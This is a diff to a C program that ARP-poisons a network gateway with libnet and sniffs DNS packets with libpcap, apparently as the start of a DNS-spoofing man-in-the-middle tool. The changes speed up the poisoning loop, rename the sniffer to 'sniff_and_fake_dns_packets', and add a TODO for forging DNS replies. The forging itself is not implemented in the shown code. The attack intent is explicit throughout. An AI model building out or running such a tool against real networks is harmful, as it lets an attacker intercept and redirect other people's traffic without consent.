@@ -65,7 +65,7 @@ void start_arp_poisoning(char *interface_name, char *gateway_ip_addr, int jam_al
   while (1)
   {
     libnet_write(ln);
-    sleep(10);
+    sleep(5);
   }
   libnet_destroy(ln);
 }
@@ -87,18 +87,19 @@ void stop(int signo)
   exit(EXIT_SUCCESS);
 }
 /**
- * Is called when a dns packet is sniffed. Creates a fake dns response and sends it back to the client.
+ * Creates a fake dns response and sends it back to the client.
  */
 void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
 {
   printf("[%dB of %dB]\n", h->caplen, h->len);
+  // TODO Send fake dns response
 }
 /**
- * Sets up libpcap and starts sniffing for dns packets. pcap_loop is a blocking function
- * so this function has to be started in a separate thread.
+ * Sets up libpcap and starts sniffing for dns packets. When a dns packet is sniffed, it calls the
+ * trap function. This function has to be started in a separate thread, because "pcap_loop" blocks.
  * @param interface_name name of the interface on which libpcap will sniff (eg. "wlo1")
  */
-void *filter_dns_packets(void *interface_name)
+void *sniff_and_fake_dns_packets(void *interface_name)
 {
   bpf_u_int32 netp, maskp;
   struct bpf_program fp;
@@ -123,13 +124,12 @@ void *filter_dns_packets(void *interface_name)
   return NULL;
 }
 //===================================================
-
 int main(int argc, char **argv)
 {
   check_prerequisites(argc, argv);
 
   pthread_t pth1;
-  pthread_create(&pth1, NULL, filter_dns_packets, argv[1]);
+  pthread_create(&pth1, NULL, sniff_and_fake_dns_packets, argv[1]);
 
   start_arp_poisoning(argv[1], argv[2], 0);
 
